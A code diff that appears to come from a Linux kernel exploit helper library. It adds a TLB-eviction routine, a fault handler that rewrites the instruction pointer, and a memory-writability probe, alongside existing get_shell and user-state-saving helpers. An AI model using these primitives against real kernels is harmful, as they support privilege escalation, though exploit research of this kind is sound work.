@@ -2,6 +2,8 @@
 #include "util.h"
 #include <fcntl.h>
 #include <pthread.h>
+#include <setjmp.h>
+#include <signal.h>
 #include <stdarg.h>
 #include <sys/mman.h>
 #include <sys/resource.h>
@@ -79,13 +81,11 @@ static void get_shell(void) {
 
 uint64_t user_cs, user_ss, user_sp, user_rflags;
 void save_state(void) {
-    __asm__(".intel_syntax noprefix;"
-            "mov user_cs, cs;"
+    __asm__("mov user_cs, cs;"
             "mov user_ss, ss;"
             "mov user_sp, rsp;"
             "pushf;"
-            "pop user_rflags;"
-            ".att_syntax;");
+            "pop user_rflags;");
 }
 
 void assign_thread_to_core(int core_id) {
@@ -134,7 +134,7 @@ int ulimit_fd(void) {
         return 1;
     }
 
-    printf("New maximum file descriptors limit: %ld\n", rlim.rlim_cur);
+    info("New maximum file descriptors limit: %ld\n", rlim.rlim_cur);
 
     return 0;
 }
@@ -234,4 +234,106 @@ void evict_tlb() {
             errExit("munmap failed\n");
         }
     }
+}
+
+#define TLB_EVICT2_PAGES 0x4000
+
+void evict_tlb2(void) {
+    const size_t len = TLB_EVICT2_PAGES * PAGE_SIZE;
+    volatile unsigned char *base =
+        mmap(PTI_TO_VIRT(4, 0, 0, 0), len, PROT_READ,
+             MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_NORESERVE, -1, 0);
+    volatile unsigned char sink = 0;
+
+    if (base == MAP_FAILED) {
+        errExit("evict_tlb2 mmap failed");
+    }
+
+    /*
+     * The odd multiplier permutes every page in this power-of-two-sized
+     * region. This varies both PTE and PMD index bits while avoiding a
+     * simple sequential replacement pattern.
+     */
+    for (unsigned pass = 0; pass < 2; ++pass) {
+        for (size_t i = 0; i < TLB_EVICT2_PAGES; ++i) {
+            size_t page = (i * 8191 + pass * 4099) & (TLB_EVICT2_PAGES - 1);
+            /*
+             * Read faults use the shared zero page. Writing here would
+             * allocate one private physical page per TLB entry.
+             */
+            sink ^= base[page * PAGE_SIZE];
+        }
+    }
+
+    if (munmap((void *)base, len) < 0) {
+        errExit("evict_tlb2 munmap failed");
+    }
+
+    (void)sink;
+}
+
+static sigjmp_buf g_fault_jmp;
+static volatile sig_atomic_t g_probing = 0;
+static volatile sig_atomic_t g_writable_probe_active = 0;
+static volatile sig_atomic_t g_writable_probe_faulted = 0;
+static volatile uintptr_t g_writable_probe_addr = 0;
+static volatile uintptr_t g_writable_probe_resume = 0;
+
+static void fault_handler(int sig, siginfo_t *si, void *ctx) {
+    if (g_writable_probe_active &&
+        (uintptr_t)si->si_addr == g_writable_probe_addr) {
+        ucontext_t *uc = ctx;
+
+        g_writable_probe_faulted = 1;
+        g_writable_probe_active = 0;
+        uc->uc_mcontext.gregs[REG_RIP] = g_writable_probe_resume;
+        return;
+    }
+
+    if (g_probing) {
+        g_probing = 0;
+        siglongjmp(g_fault_jmp, sig);
+    }
+
+    exit(128 + sig);
+}
+
+static bool g_fault_handler_installed = false;
+void install_fault_handler(void) {
+    struct sigaction sa = {0};
+
+    sa.sa_flags = SA_SIGINFO | SA_NODEFER;
+    sa.sa_sigaction = fault_handler;
+    sigemptyset(&sa.sa_mask);
+
+    sigaction(SIGSEGV, &sa, NULL);
+    sigaction(SIGBUS, &sa, NULL);
+    sigaction(SIGILL, &sa, NULL);
+
+    g_fault_handler_installed = true;
+}
+
+// check if an address is writable, surviving a segfault
+bool is_writable(void *addr) {
+    if (!g_fault_handler_installed) {
+        errExit("fault handler was not installed, call install_fault_handler() "
+                "before using this func \n");
+    }
+    unsigned char value = *(volatile unsigned char *)addr;
+
+    g_writable_probe_faulted = 0;
+    g_writable_probe_addr = (uintptr_t)addr;
+    g_writable_probe_resume = (uintptr_t)&&probe_resume;
+    g_writable_probe_active = 1;
+
+    __asm__ volatile("mov byte ptr [%1], %b0\n\t"
+                     :
+                     : "q"(value), "r"(addr)
+                     : "memory");
+
+probe_resume:
+    g_writable_probe_active = 0;
+    g_writable_probe_addr = 0;
+    g_writable_probe_resume = 0;
+    return !g_writable_probe_faulted;
 }
